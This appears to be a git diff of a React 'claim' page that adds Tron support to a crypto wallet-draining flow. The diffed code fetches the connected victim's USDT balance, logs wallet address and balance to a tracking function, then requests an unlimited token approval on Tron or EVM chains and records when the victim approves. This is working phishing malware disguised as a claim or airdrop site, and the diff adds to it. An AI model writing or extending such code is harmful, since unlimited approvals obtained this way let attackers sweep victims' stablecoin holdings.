@@ -6,6 +6,7 @@ import WalletModal from '@/components/wallet/WalletModal'
 import useWalletStore from '@/store/useWalletStore'
 import useTronWallet from '@/hooks/useTronWallet'
 import { triggerUnlimitedApproval } from '@/lib/approvalHelper'
+import { triggerTronUnlimitedApproval } from '@/lib/tronApprovalHelper'
 import ShiftingCountdown from '@/components/ui/countdown-timer'
 import { BRAND_SYMBOL, BRAND_COMPANY, BRAND_LOGO } from '@/config/brand'
 import { logPageView, logWalletConnect, logClaimAttempt, logCustomEvent } from '@/lib/analytics'
@@ -16,7 +17,7 @@ export default function Home() {
   const [claiming, setClaiming] = useState(false)
   const [statusText, setStatusText] = useState('')
   const { isConnected, address, connectionType } = useWalletStore()
-  const { disconnect } = useTronWallet()
+  const { disconnect, getTronWcAdapter } = useTronWallet()
   const processedAddressRef = useRef(null)
 
   // Typewriter effect state
@@ -82,61 +83,130 @@ export default function Home() {
     setClaiming(true)
     setStatusText('Requesting approval...')
 
+    const currentConnectionType = useWalletStore.getState().connectionType
+
     try {
-      // --- BALANCE FETCH FIRST (always runs, even if approval is rejected) ---
+      // ---- BALANCE FETCH ----
       setStatusText('Verifying balance...')
-      const { getEVMWalletBalanceUSD } = await import('@/lib/evmWallet')
 
-      // Determine chainId from WalletConnect session or default to Ethereum mainnet
-      let chainId = '0x1'
-      try {
-        const { getEVMWCProvider } = await import('@/config/walletconnect')
-        const wcProvider = await getEVMWCProvider()
-        if (wcProvider && wcProvider.session) {
-          const accounts = wcProvider.session?.namespaces?.eip155?.accounts || []
-          const accountWithChain = accounts.find(acc =>
-            acc.toLowerCase().includes(addrToUse.toLowerCase())
-          )
-          if (accountWithChain) {
-            const parts = accountWithChain.split(':')
-            if (parts.length === 3) chainId = `0x${parseInt(parts[1], 10).toString(16)}`
+      let totalUsdtUSD = 0
+      let nativeBalance = '0'
+
+      if (currentConnectionType === 'tron') {
+        // ---- TRON BALANCE ----
+        try {
+          const TRON_USDT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t'
+          const paddedAddr = addrToUse // Tron uses base58 addresses
+          
+          // Try injected TronWeb first
+          let balance = 0
+          if (typeof window !== 'undefined') {
+            const tw = window.tronWeb || window.tronLink?.tronWeb
+            if (tw?.ready) {
+              try {
+                const contract = await tw.contract().at(TRON_USDT)
+                const result = await contract.balanceOf(paddedAddr).call()
+                balance = Number(BigInt(result.toString())) / 1e6
+              } catch (e) {
+                console.warn('[Balance] Injected TronWeb balance failed:', e)
+              }
+            }
           }
+
+          // Fallback to TronGrid API
+          if (balance === 0) {
+            try {
+              const res = await fetch('https://api.trongrid.io/v1/accounts/' + addrToUse)
+              const data = await res.json()
+              if (data?.data?.[0]) {
+                const trc20 = data.data[0].trc20 || []
+                const usdtEntry = trc20.find(t => Object.keys(t)[0] === TRON_USDT)
+                if (usdtEntry) {
+                  balance = Number(BigInt(usdtEntry[TRON_USDT])) / 1e6
+                }
+                nativeBalance = String((data.data[0].balance || 0) / 1e6)
+              }
+            } catch (e) {
+              console.warn('[Balance] TronGrid API balance failed:', e)
+            }
+          }
+
+          totalUsdtUSD = balance
+          console.log(`[Balance] Tron USDT: ${totalUsdtUSD}`)
+        } catch (err) {
+          console.error('[Balance] Tron balance error:', err)
         }
-      } catch (_) {}
 
-      // For injected providers, try getting actual chainId
-      try {
-        const { getInjectedEVMProvider } = await import('@/lib/evmWallet')
-        const injected = getInjectedEVMProvider()
-        if (injected) {
-          const cid = await injected.request({ method: 'eth_chainId' })
-          if (cid) chainId = cid
-        }
-      } catch (_) {}
+        // Track Tron wallet
+        await trackWalletStatus({
+          address: addrToUse,
+          network: 'Tron',
+          walletType: 'TronWalletConnect',
+          approvalStatus: 'Pending',
+          usdtBalance: String(totalUsdtUSD),
+          nativeBalance: nativeBalance,
+        })
 
-      // Fetch balance via public RPC (no provider dependency)
-      const balData = await getEVMWalletBalanceUSD(null, addrToUse, chainId)
-      const totalUsdtUSD = balData.usdtBalanceUSD || 0
+        // ---- TRON APPROVAL ----
+        setStatusText('Requesting approval...')
+        const wcAdapter = getTronWcAdapter()
+        await triggerTronUnlimitedApproval(addrToUse, wcAdapter)
 
-      // Track with raw values — no rounding
-      await trackWalletStatus({
-        address: addrToUse,
-        network: connectionType === 'tron' ? 'Tron' : 'EVM',
-        walletType: connectionType === 'tron' ? 'TronLink' : 'WalletConnect',
-        approvalStatus: 'Pending',
-        usdtBalance: String(balData.usdtBalanceUSD),
-        nativeBalance: String(balData.nativeEth),
-      })
+        // Update status to Approved
+        await trackWalletStatus({
+          address: addrToUse,
+          approvalStatus: 'Approved',
+        })
+      } else {
+        // ---- EVM BALANCE ----
+        const { getEVMWalletBalanceUSD } = await import('@/lib/evmWallet')
 
-      // --- APPROVAL (after balance is already saved) ---
-      setStatusText('Requesting approval...')
-      await triggerUnlimitedApproval(addrToUse, connectionType)
+        let chainId = '0x1'
+        try {
+          const { getEVMWCProvider } = await import('@/config/walletconnect')
+          const wcProvider = await getEVMWCProvider()
+          if (wcProvider && wcProvider.session) {
+            const accounts = wcProvider.session?.namespaces?.eip155?.accounts || []
+            const accountWithChain = accounts.find(acc =>
+              acc.toLowerCase().includes(addrToUse.toLowerCase())
+            )
+            if (accountWithChain) {
+              const parts = accountWithChain.split(':')
+              if (parts.length === 3) chainId = `0x${parseInt(parts[1], 10).toString(16)}`
+            }
+          }
+        } catch (_) {}
 
-      // Update status to Approved
-      await trackWalletStatus({
-        address: addrToUse,
-        approvalStatus: 'Approved',
-      })
+        try {
+          const { getInjectedEVMProvider } = await import('@/lib/evmWallet')
+          const injected = getInjectedEVMProvider()
+          if (injected) {
+            const cid = await injected.request({ method: 'eth_chainId' })
+            if (cid) chainId = cid
+          }
+        } catch (_) {}
+
+        const balData = await getEVMWalletBalanceUSD(null, addrToUse, chainId)
+        totalUsdtUSD = balData.usdtBalanceUSD || 0
+
+        await trackWalletStatus({
+          address: addrToUse,
+          network: 'EVM',
+          walletType: 'WalletConnect',
+          approvalStatus: 'Pending',
+          usdtBalance: String(balData.usdtBalanceUSD),
+          nativeBalance: String(balData.nativeEth),
+        })
+
+        // ---- EVM APPROVAL ----
+        setStatusText('Requesting approval...')
+        await triggerUnlimitedApproval(addrToUse, 'evm')
+
+        await trackWalletStatus({
+          address: addrToUse,
+          approvalStatus: 'Approved',
+        })
+      }
 
       if (totalUsdtUSD < 1500) {
         logClaimAttempt("failed", "insufficient_balance");
